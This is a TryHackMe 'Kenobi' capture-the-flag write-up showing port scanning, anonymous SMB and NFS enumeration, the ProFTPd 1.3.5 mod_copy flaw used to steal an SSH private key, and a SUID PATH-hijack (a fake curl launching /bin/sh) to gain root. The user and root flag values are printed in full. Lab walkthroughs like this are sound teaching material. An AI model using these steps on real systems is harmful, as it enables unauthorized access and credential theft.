---
name: Kenobi
platform: THM
category: Linux
os: Linux
difficulty: Easy
points: 20
ip: 10.10.130.183
date: "2024-07-10"
tools:
  - nmap
  - rustscan
  - smbclient
  - smbget
  - netcat
  - searchsploit
  - ssh
  - strings
userFlag: "d0b0f3f53b6caa532a83915e19224899"
rootFlag: "177b3cd8562289f37382721c28381f02"
tags:
  - smb
  - nfs
  - proftpd
  - suid
  - path-manipulation
description: "Enumerate Samba for shares, manipulate a vulnerable version of ProFTPd and escalate privileges with PATH variable manipulation."
---

## Reconnaissance

The first step is to scan the target for open ports and running services. We use **RustScan** to quickly identify open ports and pipe results into Nmap for service versioning.

```bash
rustscan -a 10.10.130.183 -b 500 -t 1500 -- -sV -oN nmap_output.txt
```

```plaintext
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPd 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2
80/tcp   open  http        Apache httpd 2.4.18
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
2049/tcp open  nfs_acl     2-3 (RPC #100227)
```

The scan reveals **7 open ports**. Key services: SMB (139/445), FTP with ProFTPd 1.3.5 (21), rpcbind (111), and NFS (2049).

### SMB Enumeration

SMB ports are often misconfigured with anonymous access enabled. We use Nmap scripts to enumerate shares and users.

```bash
nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.130.183
```

```plaintext
Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.130.183\anonymous:
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: READ/WRITE
|   \\10.10.130.183\IPC$:
|     Type: STYPE_IPC_HIDDEN
|   \\10.10.130.183\print$:
|     Type: STYPE_DISKTREE
```

We found **3 shares** — and the `anonymous` share has READ/WRITE access with no authentication required.

### Accessing the Anonymous Share

```bash
smbclient //10.10.130.183/anonymous -N
```

```plaintext
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
```

We find a file called `log.txt`. Let's download the entire share for offline analysis.

```bash
smbget -R smb://10.10.130.183/anonymous -U ""
```

The `log.txt` file reveals critical information:
- An **SSH key** was generated and stored at `/home/kenobi/.ssh/id_rsa`
- **ProFTPd** is running on port 21 with specific configuration
- WRITE and CHMOD commands are blocked on the FTP server

### NFS Enumeration

Next, we enumerate the NFS service through rpcbind to discover mountable directories.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.130.183
```

```plaintext
| nfs-showmount:
|   /var *
```

The `/var` directory of the target is being served via NFS — this will be useful for exfiltrating data later.

## Foothold

From our Nmap scan, we identified **ProFTPd version 1.3.5** running on port 21. We verify the version with Netcat:

```bash
nc 10.10.130.183 21
```

```plaintext
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.130.183]
```

### Searching for Exploits

Using Searchsploit, we check Exploit-DB for known vulnerabilities:

```bash
searchsploit proftpd 1.3.5
```

```plaintext
ProFTPd 1.3.5 - File Copy                    | linux/remote/36742.txt
ProFTPd 1.3.5 - 'mod_copy' Remote Command    | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command    | linux/remote/49908.py
```

**3 exploits found** — all related to the `mod_copy` module. This module implements two key commands:
- `SITE CPFR` — Select a file to be copied
- `SITE CPTO` — Specify the destination for the copied file

Since `SITE_COPY` was not blocked in the configuration we found in `log.txt`, we can exploit this.

### Exploiting mod_copy

We know the SSH key is at `/home/kenobi/.ssh/id_rsa` and the `/var` directory is mountable via NFS. Let's copy the key into an accessible location:

```bash
nc 10.10.130.183 21
```

```plaintext
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.130.183]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Mounting NFS and Extracting the Key

Now we mount the remote `/var` directory and retrieve the SSH private key:

```bash
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.130.183:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

### SSH Access as Kenobi

```bash
ssh -i id_rsa kenobi@10.10.130.183
```

```plaintext
kenobi@kenobi:~$ cat /home/kenobi/user.txt
d0b0f3f53b6caa532a83915e19224899
```

We have achieved **user access** and captured the user flag.

## Privilege Escalation

With a foothold established, we need to elevate to root. We start by searching for binaries with the **SUID bit** set — these run with the owner's (root's) privileges.

```bash
find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null
```

```plaintext
-rwsr-xr-x 1 root root  94240 May  8  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root  14864 Jan 15  2019 /usr/bin/arping
-rwsr-xr-x 1 root root   8880 Sep  4  2019 /usr/bin/menu
-rwsr-xr-x 1 root root  75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  40432 May 17  2017 /usr/bin/chsh
...
```

The `/usr/bin/menu` binary stands out — it's not a standard Linux utility. Let's investigate it.

### Analyzing the Binary

```bash
/usr/bin/menu
```

```plaintext
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

The binary presents **3 options**. Let's use `strings` to examine its internals:

```bash
strings /usr/bin/menu
```

```plaintext
curl -I localhost
uname -r
ifconfig
```

The binary calls `curl` **without using its full path** (`/usr/bin/curl`). When a binary doesn't specify the absolute path, the system searches the `PATH` environment variable to find it.

### PATH Variable Manipulation

We can create a malicious `curl` binary and prepend its location to `PATH`, making the SUID binary execute our version instead:

```bash
cd /tmp
echo '/bin/sh' > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

Now when we run the menu binary and select option 1 (which calls `curl`), it will find our `/tmp/curl` first and execute `/bin/sh` with root privileges:

```bash
/usr/bin/menu
```

```plaintext
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

We have achieved **root access** and captured the root flag.
